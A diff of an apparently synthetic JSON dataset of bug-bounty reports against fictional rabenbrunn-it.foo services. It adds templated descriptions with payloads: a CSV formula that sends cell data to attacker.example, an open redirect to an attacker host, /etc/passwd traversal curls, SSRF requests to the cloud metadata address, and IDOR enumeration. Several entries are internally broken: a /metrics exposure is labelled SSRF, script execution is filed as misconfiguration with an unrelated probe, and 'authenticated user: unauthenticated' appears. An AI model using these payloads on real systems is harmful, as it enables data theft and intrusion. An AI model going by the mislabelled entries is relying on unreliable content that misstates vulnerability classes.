+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://auth.rabenbrunn-it.foo/export?type=records`\n- Preconditions: authenticated user: support agent; app version: API 2.3\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -20915,7 +21075,8 @@
           "offset": "2d 17h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://www.rabenbrunn-it.foo/console/queue`\n- Preconditions: authenticated user: radiologist; app version: Console 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -21071,7 +21232,8 @@
           "offset": "5d 7h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.rabenbrunn-it.foo/profile`\n- Preconditions: authenticated user: unauthenticated; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21207,7 +21369,8 @@
           "offset": "6d 7h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.rabenbrunn-it.foo/api/v2/documents/`\n- Preconditions: authenticated user: citizen; app version: Web 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21371,7 +21534,8 @@
           "offset": "6d 6h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.rabenbrunn-it.foo/api/v2/documents/`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21511,7 +21675,8 @@
           "offset": "3d 16h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://auth.rabenbrunn-it.foo/v2/me`\n- Preconditions: authenticated user: citizen; app version: API 2.3\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21658,7 +21823,8 @@
           "offset": "4d 13h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://www.rabenbrunn-it.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21774,7 +21940,8 @@
           "offset": "2d 3h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://www.rabenbrunn-it.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: admin; app version: Service 1.8\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -21918,7 +22085,8 @@
           "offset": "1d 22h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://www.rabenbrunn-it.foo/profile`\n- Preconditions: authenticated user: citizen; app version: Mobile 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22053,7 +22221,8 @@
           "offset": "20h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://auth.rabenbrunn-it.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: API v2\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22225,7 +22394,8 @@
           "offset": "4d 11h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://auth.rabenbrunn-it.foo/statements/`\n- Preconditions: authenticated user: admin; app version: Console 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22324,7 +22494,8 @@
           "offset": "4d 2h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://www.rabenbrunn-it.foo/api/documents/`\n- Preconditions: authenticated user: unauthenticated; app version: API 2.3\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22446,7 +22617,8 @@
           "offset": "6d",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.rabenbrunn-it.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: authenticated user; app version: Console 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22581,7 +22753,8 @@
           "offset": "3d 8h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.rabenbrunn-it.foo/api/import`\n- Preconditions: authenticated user: radiologist; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22688,7 +22861,8 @@
           "offset": "6d 4h",
           "message": "Confirmed behavior on latest build; attaching version string."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.rabenbrunn-it.foo/statements/`\n- Preconditions: authenticated user: citizen; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22808,7 +22982,8 @@
           "offset": "2d 17h",
           "message": "Uploaded redacted logs illustrating server-side trace."
         }
-      ]
+      ],
+      "description": "The login flow accepts external URLs in the returnUrl parameter, enabling phishing chains and potential token leakage.\n\n### Technical analysis\n- Vulnerability class: **Open Redirect**\n- Affected target: `https://portal.rabenbrunn-it.foo/login?returnUrl=https://evil.foo`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```http\nGET /login?returnUrl=https://attacker.example/collect HTTP/1.1\nHost: victim.example\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Open login with external returnUrl.\n- After authentication, observe 302 to attacker domain.\n\n### Recommendations\n- Validate `returnUrl` against a strict same-origin allowlist.\n- Use state/nonce; avoid reflecting external URLs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -22942,7 +23117,8 @@
           "offset": "8d 9h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://payments.rabenbrunn-it.foo/metrics`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -23073,7 +23249,8 @@
           "offset": "3d 19h",
           "message": "Provided HAR with response headers and CSP for reference."
         }
-      ]
+      ],
+      "description": "The download endpoint authorizes by session only and does not verify ownership, allowing enumeration of other users' resources.\n\n### Technical analysis\n- Vulnerability class: **Insecure Direct Object Reference (IDOR)**\n- Affected target: `https://portal.rabenbrunn-it.foo/statements/`\n- Preconditions: authenticated user: unauthenticated; app version: Portal 2025.09\n\n```http\nGET /api/files/12345 HTTP/1.1\nHost: victim.example\nCookie: session=...\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request your own resource by ID.\n- Increment/decrement ID and observe cross-account access.\n\n### Recommendations\n- Authorize by object ownership on every read/write.\n- Use opaque identifiers; avoid incremental IDs.\n"
     },
     "triager": {
       "status": "accepted",
@@ -23244,7 +23421,8 @@
           "offset": "7d 5h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://payments.rabenbrunn-it.foo/import`\n- Preconditions: authenticated user: unauthenticated; app version: Auth 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -23374,7 +23552,8 @@
           "offset": "2d 11h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The /metrics endpoint is publicly accessible and includes identifiers in labels, exposing sensitive metadata.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.rabenbrunn-it.foo/metrics`\n- Preconditions: authenticated user: authenticated user; app version: API 2.3\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- GET /metrics and observe labels with identifiers.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -23525,7 +23704,8 @@
           "offset": "3d 3h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.rabenbrunn-it.foo/import`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -23676,7 +23856,8 @@
           "offset": "8d 7h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "CSV export writes unescaped values; cells starting with =,+,-,@ are treated as formulas by spreadsheet apps, enabling exfiltration when opened.\n\n### Technical analysis\n- Vulnerability class: **CSV Formula Injection**\n- Affected target: `https://portal.rabenbrunn-it.foo/export?type=records`\n- Preconditions: authenticated user: unauthenticated; app version: Web 2025.09\n\n```csv\n=HYPERLINK(\"https://attacker.example/?c=\"&ENCODEURL(A1))\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create a record with a field value beginning with a formula string.\n- Export CSV and open in Excel/LibreOffice; observe formula execution.\n\n### Recommendations\n- Prefix cells starting with `=,+,-,@` with a single quote.\n- Export CSV as text-safe or use TSV.\n"
     },
     "triager": {
       "status": "accepted",
@@ -23807,7 +23988,8 @@
           "offset": "6d 5h",
           "message": "Shared curl one-liner to help reproduce quickly."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://payments.rabenbrunn-it.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: admin; app version: API v2\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -23930,7 +24112,8 @@
           "offset": "2d 23h",
           "message": "Re-tested on staging after patch; please confirm rollout window."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.rabenbrunn-it.foo/fetch`\n- Preconditions: authenticated user: support agent; app version: Mobile 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -24046,7 +24229,8 @@
           "offset": "3d 21h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://payments.rabenbrunn-it.foo/admin/items`\n- Preconditions: authenticated user: authenticated user; app version: Web 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -24161,7 +24345,8 @@
           "offset": "7d 23h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://payments.rabenbrunn-it.foo/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -24291,7 +24476,8 @@
           "offset": "1d 3h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "A filename parameter is concatenated into a path without proper normalization, allowing traversal to system files.\n\n### Technical analysis\n- Vulnerability class: **Path Traversal**\n- Affected target: `https://portal.rabenbrunn-it.foo/support/logs?file=../../../../etc/passwd`\n- Preconditions: authenticated user: support agent; app version: Service 1.8\n\n```bash\n# Accessing /etc/passwd via traversal\ncurl 'https://example/download?file=../../../../etc/passwd'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Request with file parameter using ../ traversal to system file.\n- Observe returned file content.\n\n### Recommendations\n- Normalize paths; reject `..` and absolute paths.\n- Enforce rooted directories and access checks by owner.\n- Use safe file APIs; avoid string concatenation.\n"
     },
     "triager": {
       "status": "accepted",
@@ -24434,7 +24620,8 @@
           "offset": "19h",
           "message": "Added sanitized PoC variant to avoid external calls."
         }
-      ]
+      ],
+      "description": "User-provided content is persisted and rendered via an unsafe primitive in an admin-facing view, leading to JavaScript execution in a privileged context.\n\n### Technical analysis\n- Vulnerability class: **Security Misconfiguration**\n- Affected target: `https://portal.rabenbrunn-it.foo/admin/items`\n- Preconditions: authenticated user: citizen; app version: Auth 2025.09\n\n```bash\n# Example probe\ncurl -i https://victim.example/endpoint\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Create object with payload in a display field (e.g., subject/memo).\n- Open the admin list/detail view and observe execution.\n\n### Recommendations\n- Validate and sanitize all user-controlled inputs.\n- Enforce allowlists and strict server-side validation.\n- Apply least-privilege and defense-in-depth (CSP, output encoding, parameterized APIs).\n"
     },
     "triager": {
       "status": "accepted",
@@ -24507,7 +24694,8 @@
           "offset": "2d 4h",
           "message": "Provided list of affected endpoints discovered during retest."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.rabenbrunn-it.foo/api/import`\n- Preconditions: authenticated user: citizen; app version: Service 1.8\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -24610,7 +24798,8 @@
           "offset": "1d 15h",
           "message": "Included additional payload variant covering alternate render path."
         }
-      ]
+      ],
+      "description": "A server-side fetch accepts attacker-controlled URLs without allowlist or private range blocking, enabling access to internal metadata/services.\n\n### Technical analysis\n- Vulnerability class: **Server-Side Request Forgery (SSRF)**\n- Affected target: `https://portal.rabenbrunn-it.foo/fetch`\n- Preconditions: authenticated user: authenticated user; app version: Portal 2025.09\n\n```bash\n# Demonstrative SSRF curl\ncurl -s 'https://api.example/foo?url=http://169.254.169.254/latest/meta-data/hostname'\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- POST url=http://169.254.169.254/latest/meta-data/ to the import endpoint.\n- Observe internal metadata persisted in the created resource.\n\n### Recommendations\n- Enforce URL allowlists; block private and metadata ranges.\n- Resolve DNS server-side; use egress allowlists.\n- Use protocol allowlists (http/https only), size/timeouts.\n"
     },
     "triager": {
       "status": "accepted",
@@ -24718,7 +24907,8 @@
           "offset": "4d 21h",
           "message": "Verified fix in Firefox and Safari; Chrome previously tested."
         }
-      ]
+      ],
+      "description": "The API returns Access-Control-Allow-Origin: * with Access-Control-Allow-Credentials: true, allowing any origin to read responses with cookies.\n\n### Technical analysis\n- Vulnerability class: **Misconfigured CORS**\n- Affected target: `https://portal.rabenbrunn-it.foo/api/me`\n- Preconditions: authenticated user: support agent; app version: Portal 2025.09\n\n```http\nHTTP/1.1 200 OK\nAccess-Control-Allow-Origin: *\nAccess-Control-Allow-Credentials: true\n```\n\n### Why this is a security issue\nThe behavior allows an attacker to influence a security-sensitive operation, leading to confidentiality, integrity, or availability impact beyond intended access controls.\n\n### Exploitation details\n- Host malicious page and fetch protected endpoint with credentials.\n- Observe successful JSON read in attacker origin.\n\n### Recommendations\n- Do not combine `Access-Control-Allow-Origin: *` with credentials.\n- Reflect only allowlisted origins; disable credentials unless necessary.\n"
     },
     "triager": {
       "status": "accepted",
@@ -24850,7 +25040,8 @@
           "offset": "1d 18h",
           "message": "Shared minimal HTML page to demonstrate issue reliably."
         }
-      ]
+      ],
